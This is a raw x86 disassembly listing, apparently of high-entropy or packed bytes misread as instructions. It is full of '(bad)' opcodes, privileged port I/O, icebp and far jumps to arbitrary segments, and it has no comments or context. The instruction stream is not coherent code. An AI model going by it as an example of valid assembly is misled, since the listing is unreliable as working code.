  417ffb:	cmp    bl,BYTE PTR [ecx+eiz*2]
  417ffe:	pop    ebx
  417fff:	icebp  
  418000:	outs   dx,DWORD PTR ds:[esi]
  418001:	sbb    eax,0x48557024
  418006:	dec    ebx
  418007:	aam    0x84
  418009:	enter  0x9fb9,0xe0
  41800d:	lods   al,BYTE PTR ds:[esi]
  41800e:	daa    
  41800f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418010:	into   
  418011:	mov    WORD PTR [esi],ss
  418013:	mov    edx,0xfd6fc45f
  418018:	xchg   edi,ebp
  41801a:	dec    edi
  41801b:	push   esi
  41801c:	pop    ebx
  41801d:	push   esi
  41801e:	out    0x22,eax
  418020:	cs sbb eax,0xe7d4b5a2
  418026:	pop    ebp
  418027:	cmp    dl,BYTE PTR [eax+ebx*2+0xc957fb3]
  41802e:	mov    ss,WORD PTR [esi+0x409f9d2c]
  418034:	or     bl,BYTE PTR [ecx]
  418036:	cmc    
  418037:	fcom   DWORD PTR [eax+ecx*2]
  41803a:	test   eax,0xd2871446
  41803f:	add    cl,BYTE PTR [eax]
  418041:	adc    dh,0x61
  418044:	mov    dl,BYTE PTR [ecx-0x41]
  418047:	cmp    eax,esp
  418049:	mov    ds:0x6e31ec18,eax
  41804e:	push   edx
  41804f:	test   eax,0xb2f52e3f
  418054:	mov    ebp,DWORD PTR [ebp+0x48cd1850]
  41805a:	fiadd  WORD PTR [eax]
  41805c:	fs sti 
  41805e:	(bad)  
  41805f:	cmp    BYTE PTR [edx+0xbe992e8],cl
  418065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418066:	mov    bl,BYTE PTR [eax+edx*8+0x582f5933]
  41806d:	sub    al,0x8f
  41806f:	jl     0x418011
  418071:	adc    DWORD PTR [edi-0x5674933d],esp
  418077:	test   eax,0xde9a7b6a
  41807c:	lock dec ecx
  41807e:	pop    es
  41807f:	repnz adc al,0x4b
  418082:	test   BYTE PTR [edi-0x24],dl
  418085:	imul   ebp,DWORD PTR [ebp+0x1092c319],0xffffffe5
  41808c:	or     DWORD PTR [ebx],0x9f935cdc
  418092:	(bad)  [ecx-0x6115ffa3]
  418098:	rcl    BYTE PTR [esp+ebx*1+0x5fb09d48],cl
  41809f:	aaa    
  4180a0:	inc    edx
  4180a1:	call   0xfdb3:0x77a0932f
  4180a8:	jg     0x418067
  4180aa:	cmp    al,BYTE PTR [esi]
  4180ac:	fidiv  DWORD PTR [edx+edx*8]
  4180af:	adc    al,0x82
  4180b1:	xor    eax,0xef78808d
  4180b6:	jns    0x418062
  4180b8:	loope  0x418090
  4180ba:	add    eax,0xad336348
  4180bf:	push   edx
  4180c0:	hlt    
  4180c1:	jb     0x4180f8
  4180c3:	jno    0x418088
  4180c5:	aad    0xd3
  4180c7:	mov    ebx,0xc32847c9
  4180cc:	add    eax,0xe264aaf7
  4180d1:	(bad)  
  4180d2:	adc    bh,BYTE PTR [esi+0x6c]
  4180d5:	sub    BYTE PTR [ebx-0x52],dl
  4180d8:	adc    al,0x59
  4180da:	mul    ah
  4180dc:	xchg   bl,al
  4180de:	pop    edi
  4180df:	mov    esp,0xe7f1e9a5
  4180e4:	or     cl,dl
  4180e6:	rcl    ah,1
  4180e8:	das    
  4180e9:	fwait
  4180ea:	inc    edi
  4180eb:	stc    
  4180ec:	fwait
  4180ed:	scas   eax,DWORD PTR es:[edi]
  4180ee:	or     esi,0xc8eb6089
  4180f4:	fmul   DWORD PTR [edi]
  4180f6:	mov    edi,ss
  4180f8:	push   edx
  4180f9:	icebp  
  4180fa:	sahf   
  4180fb:	pop    ebp
  4180fc:	push   ecx
  4180fd:	inc    edi
  4180fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180ff:	retf   0x9b16
  418102:	adc    al,0x9c
  418104:	imul   edx,DWORD PTR [edx+0x104628fc],0x1e
  41810b:	push   ebx
  41810c:	ja     0x41814d
  41810e:	mov    al,0x62
  418110:	sbb    DWORD PTR [eax+0x6e5bd053],esp
  418116:	add    eax,0xd9285587
  41811b:	fst    DWORD PTR [ebx+0x4ad24a3f]
  418121:	lock mov ecx,0xe1e4a93
  418127:	pop    ecx
  418128:	fcomip st,st(2)
  41812a:	mov    ebp,0x118dcc76
  41812f:	call   0x5937:0xe5fd4e44
  418136:	xchg   edx,eax
  418137:	mov    ds:0x1118b4c,al
  41813c:	mov    dh,0x7d
  41813e:	test   eax,0xebc7cd74
  418143:	jle    0x418158
  418145:	jbe    0x418148
  418147:	dec    ebp
  418148:	in     al,0x26
  41814a:	xor    ebx,DWORD PTR [ebx]
  41814c:	or     bl,BYTE PTR [edx+eax*1+0x4629374]
  418153:	sar    BYTE PTR [ebx-0x392b8e1a],cl
  418159:	cmp    al,0x8f
  41815b:	mov    eax,ds:0xf98771d6
  418160:	mov    ah,0x4e
  418162:	test   BYTE PTR [ebx],dh
  418164:	push   0x4884c49f
  418169:	xor    edi,DWORD PTR [esi+0x650f20a9]
  41816f:	xchg   BYTE PTR [ebx-0x44],dl
  418172:	call   0xca55:0x9992d836
  418179:	sti    
  41817a:	mov    ds:0xe1f9af8b,eax
  41817f:	aas    
  418180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418181:	popa   
  418182:	jl     0x418106
  418184:	es jmp 0x418200
  418187:	test   eax,0xe772cca4
  41818c:	fstp   DWORD PTR ds:0x5b266ad
  418192:	mov    al,0x68
  418194:	pop    esi
  418195:	js     0x418127
  418197:	push   esp
  418198:	pusha  
  418199:	mov    ch,0xca
  41819b:	jecxz  0x4181ea
  41819d:	or     DWORD PTR [ebx+0x77f1f3eb],0xfffffff0
  4181a4:	inc    edi
  4181a5:	sub    eax,0x956e84f6
  4181aa:	jecxz  0x418174
  4181ac:	jl     0x418179
  4181ae:	dec    eax
  4181af:	or     DWORD PTR ds:0x31c4ebb9,esp
  4181b5:	clc    
  4181b6:	popf   
  4181b7:	pop    ebp
  4181b8:	mov    edi,0x7e31df90
  4181bd:	es scas al,BYTE PTR es:[edi]
  4181bf:	xor    BYTE PTR cs:[ebx],bl
  4181c2:	xchg   esp,eax
  4181c3:	dec    ecx
  4181c4:	or     edi,DWORD PTR [edx]
  4181c6:	test   eax,0x85cbef1d
  4181cb:	cmp    ecx,DWORD PTR ds:0xd1808fb
  4181d1:	xchg   ecx,eax
  4181d2:	inc    ecx
  4181d3:	imul   ebx,DWORD PTR [esi+eax*8-0x2d],0xc5302df9
  4181db:	or     ch,cl
  4181dd:	jge    0x4181bf
  4181df:	call   0x1d226008
  4181e4:	ins    DWORD PTR es:[edi],dx
  4181e5:	and    DWORD PTR [edx-0x79],edi
  4181e8:	cwde   
  4181e9:	call   0xf0ea:0x550172f7
  4181f0:	stos   DWORD PTR es:[edi],eax
  4181f1:	in     al,0x4a
  4181f3:	adc    al,0x81
  4181f5:	add    eax,0x2fbb7d3
  4181fa:	sbb    edx,DWORD PTR [eax-0x4df4a278]
  418200:	mov    ah,bh
  418202:	inc    ebx
  418203:	setb   BYTE PTR ds:0x6b07dcd0
  41820a:	add    cl,BYTE PTR [esi+0x36]
  41820d:	xchg   ebp,eax
  41820e:	fisubr DWORD PTR [ebx]
  418210:	(bad)  
  418213:	cmp    DWORD PTR ds:0x16e37396,ebp
  418219:	imul   eax,ebx,0x9d4f2fb2
  41821f:	add    al,0x6f
  418221:	jg     0x418229
  418223:	xchg   edx,eax
  418224:	adc    eax,0xf5a7ab7d
  418229:	dec    eax
  41822a:	(bad)  
  41822b:	les    ebx,FWORD PTR [ebp+0x1a]
  41822e:	imul   edx,DWORD PTR [ecx+0x5c],0x81df8f17
  418235:	mov    esi,0x50b52c9e
  41823a:	pop    eax
  41823b:	(bad)  
  41823c:	retf   
  41823d:	and    ecx,DWORD PTR [eax+0x540e4ec9]
  418243:	inc    ebx
  418244:	rcl    BYTE PTR [edi-0x6f],cl
  418247:	inc    ebx
  418248:	push   ds
  418249:	sbb    eax,0xff2538d3
  41824e:	cmp    dh,bl
  418250:	or     DWORD PTR [ebp-0x7f],0xffffffe8
  418254:	push   eax
  418255:	pop    eax
  418256:	cmc    
  418257:	rcl    DWORD PTR [esi-0x75],0xe7
  41825b:	rcl    DWORD PTR [eax+ebx*8],0x6c
  41825f:	lds    esi,FWORD PTR [ecx+edx*1+0x4eedc656]
  418266:	push   0x1b
  418268:	popf   
  418269:	dec    eax
  41826a:	lods   eax,DWORD PTR ds:[esi]
  41826b:	test   DWORD PTR [ebx],0x5e0f7917
  418271:	fimul  DWORD PTR [edx+ebx*8-0xde15dde]
  418278:	dec    esp
  418279:	dec    esi
  41827a:	aad    0x9e
  41827c:	mov    dl,0x61
  41827e:	cmp    al,0x45
  418280:	mov    eax,ds:0x205ec39e
  418285:	out    dx,eax
  418286:	retf   
  418287:	loop   0x418248
  418289:	xor    al,0xd4
  41828b:	jns    0x41824a
  41828d:	mov    edx,0xd814817d
  418292:	cmp    al,0x2e
  418294:	lock rcl BYTE PTR [esp+edx*1-0x6d],0x82
  41829a:	mov    WORD PTR [ebp+0x19],ds
  41829d:	pop    ebp
  41829e:	lahf   
  41829f:	stc    
  4182a0:	xchg   ebp,eax
  4182a1:	sbb    eax,0x32e43ad2
  4182a6:	inc    ebp
  4182a7:	test   BYTE PTR [edi-0x5c],0x5d
  4182ab:	lahf   
  4182ac:	inc    edi
  4182ad:	rol    DWORD PTR [ebp-0x65df28a3],0x6b
  4182b4:	iret   
  4182b5:	pop    ebx
  4182b6:	stos   DWORD PTR es:[edi],eax
  4182b7:	into   
  4182b8:	aam    0x4
  4182ba:	(bad)  
  4182bb:	or     al,0x62
  4182bd:	iret   
  4182be:	test   al,0xf6
  4182c0:	adc    DWORD PTR [ebx],edi
  4182c2:	into   
  4182c3:	mov    esp,0x608f911c
  4182c8:	imul   ecx,DWORD PTR [bp+di],0xffffffdc
  4182cc:	add    ch,BYTE PTR [ebp+0x55]
  4182cf:	or     eax,0xb0048248
  4182d4:	mov    esi,0x852e54e3
  4182d9:	mov    ebx,0xf835008f
  4182de:	push   ebp
  4182df:	mov    esp,0xcd5402ca
  4182e4:	test   al,0x75
  4182e6:	das    
  4182e7:	ins    DWORD PTR es:[edi],dx
  4182e8:	push   ebx
  4182e9:	push   ecx
  4182ea:	and    bh,0x6d
  4182ed:	dec    eax
  4182ee:	data16 mov ah,0x86
  4182f1:	hlt    
  4182f2:	test   BYTE PTR [eax-0x2a],cl
  4182f5:	push   ecx
  4182f6:	enter  0xcb78,0x29
  4182fa:	cli    
  4182fb:	mov    eax,0xd8d2b7b4
  418300:	push   ss
  418301:	pop    ss
  418302:	out    0xd0,eax
  418304:	dec    esi
  418305:	jbe    0x418360
  418307:	retf   
  418308:	dec    eax
  418309:	inc    ecx
  41830a:	mov    edx,DWORD PTR [ecx+0x4e1a89c9]
  418310:	fisubr DWORD PTR [edx+0x43]
  418313:	enter  0x5473,0x95
  418317:	aas    
  418318:	adc    eax,0x4d33f152
  41831d:	mov    ecx,0xe1e5b5a4
  418322:	sub    DWORD PTR [ebx-0x4b],esp
  418325:	ins    BYTE PTR es:[edi],dx
  418326:	jnp    0x418394
  418328:	push   ss
  418329:	out    0x51,eax
  41832b:	xlat   BYTE PTR ds:[ebx]
  41832c:	inc    ebx
  41832d:	mov    esi,DWORD PTR gs:[ecx+0x44]
  418331:	stos   BYTE PTR es:[edi],al
  418332:	and    DWORD PTR [eax+0x3e69fcac],edx
  418338:	push   ebx
  418339:	adc    edi,ecx
  41833b:	push   0x206246a7
  418340:	dec    ebp
  418341:	mov    cs,ebx
  418343:	jge    0x4182d6
  418345:	cli    
  418346:	sbb    DWORD PTR [edx],edi
  418348:	xor    ah,bl
  41834a:	ins    BYTE PTR es:[edi],dx
  41834b:	jne    0x4183ae
  41834d:	inc    ecx
  41834e:	adc    BYTE PTR ds:0xd8f2260e,al
  418354:	sbb    eax,0x590d960d
  418359:	fst    st(0)
  41835b:	fbstp  TBYTE PTR [edx-0x5324f33d]
  418361:	cmp    al,0x28
  418363:	sub    eax,ebp
  418365:	loop   0x4182f3
  418367:	stc    
  418368:	fcom   DWORD PTR [ecx+ebp*8+0x7c]
  41836c:	cs icebp 
  41836e:	test   al,0xd3
  418370:	leave  
  418371:	xor    ebx,DWORD PTR [esi+0x124ca263]
  418377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418378:	(bad)  
  418379:	call   DWORD PTR [esi-0x7f5c2c61]
  41837f:	add    cl,bl
  418381:	fs or  al,0xa5
  418384:	mov    ebx,0x8e35d8e2
  418389:	xchg   ebp,eax
  41838a:	imul   ebp,ecx,0x9a4a4e4f
  418390:	pop    ss
  418391:	cmp    bl,al
  418393:	xor    dh,BYTE PTR [ecx]
  418395:	icebp  
  418396:	in     al,dx
  418397:	push   ebp
  418398:	shl    bl,cl
  41839a:	inc    ebx
  41839b:	sub    bl,BYTE PTR [eax]
  41839d:	sbb    ecx,0xffffffee
  4183a0:	push   cs
  4183a1:	pop    edi
  4183a2:	pop    ss
  4183a3:	pop    ebp
  4183a4:	cs ins DWORD PTR es:[edi],dx
  4183a6:	mov    bl,BYTE PTR [eax-0x3]
  4183a9:	cli    
  4183aa:	push   ecx
  4183ab:	iret   
  4183ac:	nop    DWORD PTR [ebx-0x3a5a1b3a]
  4183b3:	nop
  4183b4:	out    dx,al
  4183b5:	ins    BYTE PTR es:[edi],dx
  4183b6:	and    eax,0xf9d3c117
  4183bb:	sub    BYTE PTR ds:0xbe8c92b0,bl
  4183c1:	jae    0x4183cb
  4183c3:	(bad)  [eax-0x1e]
  4183c6:	cmp    edi,ecx
  4183c8:	push   edi
  4183c9:	mov    edi,0x8e3f60ef
  4183ce:	adc    al,0x30
  4183d0:	jae    0x4183ec
  4183d2:	dec    esi
  4183d3:	(bad)  
  4183d5:	mov    ah,0x8b
  4183d7:	mov    cl,0x8c
  4183d9:	aad    0x7f
  4183db:	ja     0x418420
  4183dd:	push   es
  4183de:	sbb    ch,BYTE PTR [edi-0x4c]
  4183e1:	xor    al,0xf
  4183e3:	cli    
  4183e4:	(bad)  
  4183e6:	div    DWORD PTR [ecx-0x6]
  4183e9:	push   esi
  4183ea:	mov    bl,0x24
  4183ec:	into   
  4183ed:	jo     0x418469
  4183ef:	jmp    0x496:0xf86c79d9
  4183f6:	inc    eax
  4183f7:	sbb    DWORD PTR ds:0x8e9e1467,ebx
  4183fd:	outs   dx,DWORD PTR ds:[esi]
  4183fe:	cs push esp
  418400:	aam    0xe3
  418402:	xchg   ebx,eax
  418403:	jmp    0xf692d426
  418408:	icebp  
  418409:	repnz aad 0xd4
  41840c:	add    bh,BYTE PTR [ebp-0x46231ef0]
  418412:	add    BYTE PTR [ecx-0x1c614dd5],ah
  418418:	shr    DWORD PTR [esi+eiz*1],0xb9
  41841c:	adc    edi,DWORD PTR [ebx]
  41841e:	push   0xffffffb5
  418420:	outs   dx,DWORD PTR ds:[esi]
  418421:	mov    eax,ds:0x26d0c055
  418426:	repnz sub esp,edi
  418429:	mov    ah,0x0
  41842b:	and    BYTE PTR [ecx+0x3f],bl
  41842e:	add    ebx,esi
  418430:	sub    ch,bh
  418432:	add    DWORD PTR [esi+ebp*2-0x6a46b2d5],edi
  418439:	inc    ecx
  41843a:	fisub  DWORD PTR [ebp+0x79e647ab]
  418440:	sub    cx,WORD PTR [edx-0x3e0af429]
  418447:	or     DWORD PTR [edi+0x49],edi
  41844a:	pop    ss
  41844b:	jmp    0x99ed:0x72f5cd7b
  418452:	jg     0x418446
  418454:	add    eax,0x3f83f231
  418459:	or     eax,0xfe16d749
  41845e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41845f:	aaa    
  418460:	(bad)  [ecx]
  418462:	jg     0x41845a
  418464:	mov    ss,ecx
  418466:	pop    esp
  418467:	neg    DWORD PTR ds:0xdd1c4b40
  41846d:	and    DWORD PTR [ebp-0x7564a5d6],ecx
  418473:	jmp    0xdc8912c
  418478:	xchg   edi,eax
  418479:	xchg   esi,eax
  41847a:	(bad)  
  41847b:	pop    ecx
  41847c:	jbe    0x418492
  41847e:	mov    al,ds:0x106b6a
  418483:	lods   eax,DWORD PTR ds:[esi]
  418484:	mov    ah,0x65
  418486:	ror    BYTE PTR [edx+eax*1+0x70],1
  41848a:	aas    
  41848b:	cmp    DWORD PTR [ecx+0x5d22c6ee],ebx
  418491:	fsubr  st,st(0)
  418493:	and    ebx,DWORD PTR [eax-0x1f754dbe]
  418499:	hlt    
  41849a:	adc    eax,0x9da22184
  41849f:	xchg   esi,eax
  4184a0:	loopne 0x4184ca
  4184a2:	inc    ebx
  4184a3:	xor    BYTE PTR [edx-0x7074d060],bl
  4184a9:	ret    0x3fe
  4184ac:	dec    ebp
  4184ad:	in     eax,dx
  4184ae:	mov    DWORD PTR [esi-0x50],edi
  4184b1:	fcom   QWORD PTR gs:[edx-0x50]
  4184b5:	push   ebp
  4184b6:	(bad)  
  4184b7:	push   ebp
  4184b8:	xlat   BYTE PTR ds:[ebx]
  4184b9:	push   esi
  4184ba:	mov    ds:0xc329950f,al
  4184bf:	adc    BYTE PTR [eax],0x8b
  4184c2:	sbb    BYTE PTR [edx+0x68f75b93],bl
  4184c8:	sub    ah,cl
  4184ca:	xlat   BYTE PTR ds:[ebx]
  4184cb:	inc    edi
  4184cc:	retf   0x6c18
  4184cf:	mov    esi,ecx
  4184d1:	adc    eax,0xd8cebc72
  4184d6:	int3   
  4184d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184d8:	mov    BYTE PTR [eax],ah
  4184da:	es loop 0x41847f
  4184dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184de:	cwde   
  4184df:	hlt    
  4184e0:	mov    al,0x76
  4184e2:	call   FWORD PTR cs:[ecx]
  4184e5:	cmp    edx,DWORD PTR [ebx+0x63]
  4184e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184e9:	scas   eax,DWORD PTR es:[edi]
  4184ea:	xlat   BYTE PTR ds:[ebx]
  4184eb:	mov    ebx,0xf5e37673
  4184f0:	mov    bh,0x5e
  4184f2:	lds    edi,FWORD PTR [edi]
  4184f4:	push   ebx
  4184f5:	rcl    BYTE PTR ds:0x43dcecdf,0x0
  4184fc:	rol    BYTE PTR [edi+0x22],1
  4184ff:	jmp    DWORD PTR [edx]
  418501:	addr16 pop ecx
  418503:	es jge 0x418536
  418506:	jo     0x41851a
  418508:	arpl   WORD PTR [esi-0x69],di
  41850b:	mov    ah,0x82
  41850d:	loop   0x4184c6
  41850f:	mov    WORD PTR [eax-0x36cac9cc],?
  418515:	loop   0x41855d
  418517:	push   ecx
  418518:	xor    BYTE PTR [ecx+0xf76c447],cl
  41851e:	xor    edx,edx
  418520:	cmp    al,0x98
  418522:	fwait
  418523:	stos   BYTE PTR es:[edi],al
  418524:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418525:	mov    ds:0x6ad89d9,eax
  41852a:	mov    dh,0x17
  41852c:	stc    
  41852d:	xchg   ecx,eax
  41852e:	aaa    
  41852f:	fs sahf 
  418531:	mov    eax,DWORD PTR [edi+0x2b]
  418534:	fsubr  DWORD PTR ds:0x44413cc3
  41853a:	dec    ebx
  41853b:	mov    WORD PTR [edx-0x32],?
  41853e:	xchg   esp,eax
  41853f:	fisttp QWORD PTR [ebx+0x223d2408]
  418545:	mov    dh,0xa8
  418547:	sub    DWORD PTR [edx-0x37],edi
  41854a:	ret    
  41854b:	mov    ebp,0xba2a91b6
  418550:	sbb    eax,0xf7c0b362
  418555:	out    dx,eax
  418556:	xor    eax,0x1f7f7c9f
  41855b:	dec    ebx
  41855c:	pop    esi
  41855d:	push   esi
  41855f:	imul   edi,DWORD PTR [eax+0x1ead155d],0xffffffaa
  418566:	mov    ds:0xff1e1ea,eax
  41856b:	dec    edi
  41856c:	lahf   
  41856d:	jb     0x41853f
  41856f:	mov    al,dh
  418571:	xchg   edi,eax
  418572:	(bad)  
  418574:	and    BYTE PTR [esp+esi*8+0x38364993],0x56
  41857c:	sub    esp,edx
  41857e:	scas   al,BYTE PTR es:[edi]
  41857f:	dec    ecx
  418580:	jmp    0x4ba:0x3ba7fd42
  418587:	jmp    0x418537
  418589:	mov    bl,0xd0
  41858b:	push   ebp
  41858c:	in     al,dx
  41858d:	lea    ebp,[esi]
  41858f:	dec    edx
  418590:	sub    eax,0x6dc3d06c
  418595:	mov    ds:0x5e2df98a,eax
  41859a:	jns    0x41855b
  41859c:	xor    eax,0x4ee5d9f5
  4185a1:	pop    edx
  4185a2:	(bad)
  4185a5:	popa   
  4185a6:	je     0x4185a4
  4185a8:	mov    ebp,0x5fb4733d
  4185ad:	jmp    0x175cbb2c
  4185b2:	inc    edx
  4185b3:	pop    esi
  4185b4:	hlt    
  4185b5:	and    eax,0x3dbff83a
  4185ba:	sbb    eax,0xd7b30ce2
  4185bf:	mov    eax,0x783bade1
  4185c4:	sub    DWORD PTR [ebp+0x17],esi
  4185c7:	or     ebp,ebx
  4185c9:	rcl    cl,cl
  4185cb:	push   esi
  4185cc:	repnz cmp DWORD PTR fs:[edx+0x23],esp
  4185d1:	(bad)  
  4185d2:	adc    eax,0x8173d800
  4185d7:	xlat   BYTE PTR ds:[ebx]
  4185d8:	outs   dx,BYTE PTR ds:[esi]
  4185d9:	call   0x96e3:0xd99e0ef4
  4185e0:	or     al,0x28
  4185e2:	ds inc eax
  4185e4:	xor    esi,DWORD PTR [ecx]
  4185e6:	lods   eax,DWORD PTR ds:[esi]
  4185e7:	dec    edx
  4185e8:	test   eax,0xd0184717
  4185ed:	cmp    esp,DWORD PTR [ebx+0x5a]
  4185f0:	test   BYTE PTR [eax-0x4b74f4ab],ch
  4185f6:	xor    edi,esp
  4185f8:	pop    ecx
  4185f9:	sahf   
  4185fa:	inc    esi
  4185fb:	pop    ecx
  4185fc:	gs xchg bh,ah
  4185ff:	sgdtd  [edx+0x6c]
  418603:	mov    al,BYTE PTR [edx+eax*4-0x301e8bba]
  41860a:	mov    ebp,0x2da97c81
  41860f:	lock add edi,DWORD PTR [eax+0x19]
  418613:	mov    dl,0xd7
  418615:	jae    0x418647
  418617:	les    edi,FWORD PTR [ebx]
  418619:	call   0x3136ad71
  41861e:	dec    ebx
  41861f:	mov    ah,0xc3
  418621:	scas   eax,DWORD PTR es:[edi]
  418622:	hlt    
  418623:	fsub   DWORD PTR [edx-0xa]
  418626:	sbb    al,0x8b
  418628:	fstp   DWORD PTR [eax-0x1e047c91]
  41862e:	jmp    0xc2e94cc6
  418633:	sbb    al,0xcb
  418635:	ja     0x418665
  418637:	xor    DWORD PTR [edi],eax
  418639:	rol    DWORD PTR [edi-0x1b],0xe2
  41863d:	jno    0x4186a8
  41863f:	and    DWORD PTR [ecx-0x68],0x75
  418643:	fld    DWORD PTR [ebx+edx*4+0x3f]
  418647:	fild   WORD PTR [ebx-0x4d]
  41864a:	fld    TBYTE PTR [eax-0x1573847f]
  418650:	mov    edx,0xedb92ef5
  418655:	mov    ebx,0x41c90113
  41865a:	rol    BYTE PTR [esi-0x3127e4d2],0x67
  418661:	jmp    0x418675
  418663:	leave  
  418664:	sbb    dh,BYTE PTR ds:0x8739fed6
  41866a:	lahf   
  41866b:	inc    eax
  41866c:	sbb    bl,bh
  41866e:	fnstcw WORD PTR [ecx]
  418670:	imul   ecx,DWORD PTR [ebx],0x4b
  418673:	retf   
  418674:	push   es
  418675:	imul   ecx,edx,0x4a
  418678:	imul   BYTE PTR [esi+0x67f687b]
  41867e:	push   eax
  41867f:	repnz push es
  418681:	add    DWORD PTR [edx],edx
  418683:	and    esi,DWORD PTR [edi-0x213b7c77]
  418689:	stos   DWORD PTR es:[edi],eax
  41868a:	jno    0x4186a9
  41868c:	iret   
  41868d:	dec    esi
  41868e:	retf   0x42c8
  418691:	add    esp,DWORD PTR [ecx+0x46daa6de]
  418697:	std    
  418698:	cmp    al,0x3a
  41869a:	rcr    BYTE PTR [ebx+eiz*8+0x11],cl
  41869e:	(bad)  
  41869f:	in     al,dx
  4186a0:	cdq    
  4186a1:	push   esi
  4186a2:	scas   eax,DWORD PTR es:[edi]
  4186a3:	jns    0x4186cc
  4186a5:	mov    bl,0x71
  4186a7:	test   eax,0x8bbea3ce
  4186ac:	loope  0x4186db
  4186ae:	xor    eax,0x17a81a59
  4186b3:	push   0x6e
  4186b5:	jecxz  0x4186da
  4186b7:	out    dx,al
  4186b8:	dec    esp
  4186b9:	std    
  4186ba:	add    DWORD PTR ss:[ecx-0x2d],ecx
  4186be:	inc    eax
  4186bf:	push   esp
  4186c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186c1:	and    eax,0xe1aeb9a9
  4186c6:	(bad)  
  4186c7:	hlt    
  4186c8:	or     eax,0xaec2bb02
  4186cd:	(bad)  
  4186ce:	jecxz  0x418703
  4186d0:	mov    edx,0x1466aec9
  4186d5:	in     al,0xfb
  4186d7:	or     dl,BYTE PTR [ecx]
  4186d9:	out    dx,al
  4186da:	popf   
  4186db:	inc    ebp
  4186dc:	cdq    
  4186dd:	pop    ebx
  4186de:	dec    ebp
  4186df:	jb     0x4186af
  4186e1:	ret    0x8069
  4186e4:	cdq    
  4186e5:	dec    edx
  4186e6:	xor    eax,0x3c9fcf36
  4186eb:	imul   bl
  4186ed:	mov    bl,0x43
  4186ef:	mov    ds:0xafa7b39f,al
  4186f4:	and    cl,BYTE PTR [ecx+0x40]
  4186f7:	fsin   
  4186f9:	loop   0x418720
  4186fb:	(bad)  
  4186fc:	scas   al,BYTE PTR es:[edi]
  4186fd:	es icebp 
  4186ff:	cmp    al,0x4c
  418701:	fs popf 
  418703:	add    BYTE PTR [edi+0x54a6a25c],cl
  418709:	out    dx,al
  41870a:	shl    DWORD PTR [edi],0xeb
  41870d:	(bad)  
  41870e:	cmp    BYTE PTR [edi+0x18a70024],bh
  418714:	(bad)  
  418715:	pop    esi
  418716:	inc    ebp
  418717:	adc    BYTE PTR [edi-0x55],ch
  41871a:	daa    
  41871b:	sbb    al,0x2d
  41871d:	add    DWORD PTR [esi],esp
  41871f:	push   esi
  418720:	arpl   WORD PTR ds:0xd1868754,bp
  418726:	nop
  418727:	data16 cli 
  418729:	popf   
  41872a:	or     eax,0xe73df53
  41872f:	jne    0x418746
  418731:	imul   ebx,ebx,0xffffffb6
  418734:	data16 (bad) 
  418736:	ror    BYTE PTR [ebx],1
  418738:	loopne 0x418750
  41873a:	adc    al,0x9d
  41873c:	sub    BYTE PTR [eax+0x445d499f],ch
  418742:	mov    ds:0xbef4d4ff,eax
  418747:	add    edi,DWORD PTR [ecx]
  418749:	jmp    0x4187bb
  41874b:	adc    dh,BYTE PTR [eax+esi*8]
  41874e:	inc    eax
  41874f:	lock fsub st,st(0)
  418752:	scas   eax,DWORD PTR es:[edi]
  418753:	fwait
  418754:	adc    eax,0xbe14d9f4
  418759:	add    al,0x1e
  41875b:	jg     0x418792
  41875d:	popf   
  41875e:	sub    DWORD PTR [edx-0x1],0x85be2c8e
  418765:	sub    eax,0xa3ada9ce
  41876a:	mov    bh,0x8a
  41876c:	xor    eax,0x16870bfe
  418771:	int    0xbf
  418773:	push   ebp
  418774:	into   
  418775:	rcl    ebx,cl
  418777:	call   0x4a3e:0x35f243cc
  41877e:	ficom  DWORD PTR [edx-0xe808e63]
  418784:	(bad)  
  418785:	jg     0x4187b2
  418787:	push   edx
  418788:	icebp  
  418789:	aaa    
  41878a:	(bad)  
  41878b:	pusha  
  41878c:	dec    edi
  41878d:	jnp    0x4187ba
  41878f:	pop    edi
  418790:	push   ecx
  418791:	add    edi,esi
  418793:	xlat   BYTE PTR ds:[ebx]
  418794:	push   cs
  418795:	dec    edx
  418796:	adc    dl,BYTE PTR [eax+edx*1+0x52]
  41879a:	out    0xad,eax
  41879c:	fist   WORD PTR [ecx]
  41879e:	fild   QWORD PTR [eax]
  4187a0:	iret   
  4187a1:	xor    eax,0x356301fc
  4187a6:	sti    
  4187a7:	cmp    cl,al
  4187a9:	jle    0x418780
  4187ab:	mov    cl,0x38
  4187ad:	xchg   DWORD PTR [ecx],ecx
  4187af:	mov    ah,0x45
  4187b1:	cmp    BYTE PTR [edx-0x7853af5c],dl
  4187b7:	out    dx,eax
  4187b8:	cdq    
  4187b9:	pop    esi
  4187ba:	push   cs
  4187bb:	repnz int3 
  4187bd:	push   cs
  4187be:	pop    es
  4187bf:	into   
  4187c0:	add    DWORD PTR [ebx],esp
  4187c2:	ds push 0x2a92459c
  4187c8:	sub    eax,0xb3888e23
  4187cd:	fisubr WORD PTR [eax-0x31]
  4187d0:	cmp    BYTE PTR [eax-0x5e7b194e],cl
  4187d6:	add    al,dl
  4187d8:	and    esp,esp
  4187da:	in     eax,dx
  4187db:	aam    0xd8
  4187dd:	outs   dx,DWORD PTR ds:[esi]
  4187de:	or     al,0x86
  4187e0:	xchg   BYTE PTR [eax-0x6e2f8bc6],dl
  4187e6:	in     al,dx
  4187e7:	pop    ebx
  4187e8:	dec    ecx
  4187e9:	retf   
  4187ea:	pop    ds
  4187eb:	icebp  
  4187ec:	sub    eax,DWORD PTR [esi-0x66]
  4187ef:	lods   eax,DWORD PTR ds:[esi]
  4187f0:	add    eax,eax
  4187f2:	adc    BYTE PTR [edx+eiz*2],bh
  4187f5:	adc    al,0x84
  4187f7:	aam    0x49
  4187f9:	dec    ecx
  4187fa:	mov    edi,0x340ed3e7
  4187ff:	jecxz  0x418880
  418801:	xor    al,0x9a
  418803:	cli    
  418804:	mov    eax,ds:0xd09fa1f4
  418809:	push   edi
  41880a:	repnz mov ah,dl
  41880d:	xchg   edi,eax
  41880e:	test   eax,0xa99c649e
  418813:	ins    BYTE PTR es:[edi],dx
  418814:	ja     0x418807
  418816:	pop    esp
